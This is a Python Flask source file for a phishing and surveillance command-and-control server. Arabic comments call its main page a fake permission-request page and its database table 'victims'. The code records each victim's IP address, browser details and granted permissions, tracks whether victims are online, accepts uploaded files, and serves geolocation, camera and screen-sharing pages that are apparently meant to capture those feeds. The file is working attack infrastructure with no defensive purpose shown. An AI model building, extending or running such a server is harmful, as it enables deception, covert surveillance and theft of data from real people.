from flask import Flask, request, jsonify, render_template, url_for
from datetime import datetime
import threading
import os
import json
import sqlite3
import uuid
from werkzeug.utils import secure_filename
from colorama import Fore, init, Style

# Initialize
init(autoreset=True)
app = Flask(__name__, template_folder="templates", static_folder="static")
app.secret_key = os.urandom(24)
app.config['UPLOAD_FOLDER'] = 'uploads'
app.config['DATABASE'] = 'c2.db'
app.config['SQLITE_THREADSAFE'] = 1

# Database setup
def get_db():
    db = getattr(threading.current_thread(), '_database', None)
    if db is None:
        db = threading.current_thread()._database = sqlite3.connect(app.config['DATABASE'])
        db.row_factory = sqlite3.Row
    return db

@app.teardown_appcontext
def close_connection(exception):
    db = getattr(threading.current_thread(), '_database', None)
    if db is not None:
        db.close()

def init_db():
    with app.app_context():
        db = get_db()
        db.execute('''
            CREATE TABLE IF NOT EXISTS victims (
                id TEXT PRIMARY KEY,
                ip TEXT,
                user_agent TEXT,
                permissions TEXT,
                first_seen DATETIME,
                last_seen DATETIME,
                is_online BOOLEAN
            )
        ''')
        db.commit()

# الصفحة المزورة لطلب الصلاحيات
@app.route('/')
def index():
    return render_template('index.html')

# API لتسجيل الضحايا
@app.route('/permissions', methods=['POST'])
def handle_permissions():
    try:
        data = request.get_json()

        if not data:
            return jsonify({'error': 'No data received'}), 400

        # البيانات الأساسية المطلوبة
        required_fields = ['clientId', 'permissions']
        if not all(field in data for field in required_fields):
            return jsonify({'error': 'Missing required fields'}), 400

        # تسجيل البيانات في قاعدة البيانات
        db = get_db()
        db.execute(
            'INSERT OR REPLACE INTO victims (id, ip, user_agent, permissions, first_seen, last_seen, is_online) '
            'VALUES (?, ?, ?, ?, ?, ?, ?)',
            (data['clientId'],
             request.remote_addr,
             request.headers.get('User-Agent'),
             json.dumps(data['permissions']),
             datetime.now(),
             datetime.now(),
             True)
        )
        db.commit()

        return jsonify({
            'status': 'success',
            'message': 'Permissions saved successfully',
            'redirect': url_for('success_page')
        })

    except Exception as e:
        print(f"{Fore.RED}Error saving permissions: {str(e)}{Style.RESET_ALL}")
        return jsonify({'error': 'Internal server error'}), 500

@app.route('/success')
def success_page():
    return render_template('success.html')

# API لفحص حالة الضحية
@app.route('/api/ping', methods=['POST'])
def ping():
    data = request.get_json()
    if not data or 'id' not in data:
        return jsonify({'error': 'Invalid request'}), 400

    db = get_db()
    db.execute(
        'UPDATE victims SET last_seen = ?, is_online = ? WHERE id = ?',
        (datetime.now(), True, data['id'])
    )
    db.commit()
    return jsonify({'status': 'pong'})

# خدمات التحميل والتنزيل
@app.route('/api/upload', methods=['POST'])
def upload_file():
    if 'file' not in request.files:
        return jsonify({'error': 'No file part'}), 400

    file = request.files['file']
    if file.filename == '':
        return jsonify({'error': 'No selected file'}), 400

    filename = secure_filename(file.filename)
    os.makedirs(app.config['UPLOAD_FOLDER'], exist_ok=True)
    file.save(os.path.join(app.config['UPLOAD_FOLDER'], filename))
    return jsonify({'status': 'uploaded', 'filename': filename})

@app.route('/api/download/<filename>')
def download_file(filename):
    return send_from_directory(app.config['UPLOAD_FOLDER'], filename)

# صفحات الخدمات
@app.route('/geo.html')
def geo_service():
    return render_template('geo.html')

@app.route('/camera.html')
def camera_service():
    return render_template('camera.html')

@app.route('/screenshare.html')
def screenshare_service():
    return render_template('screenshare.html')

if __name__ == '__main__':
    os.makedirs('victims', exist_ok=True)
    os.makedirs('uploads', exist_ok=True)
    init_db()
    app.run(host='0.0.0.0', port=5000, debug=True)
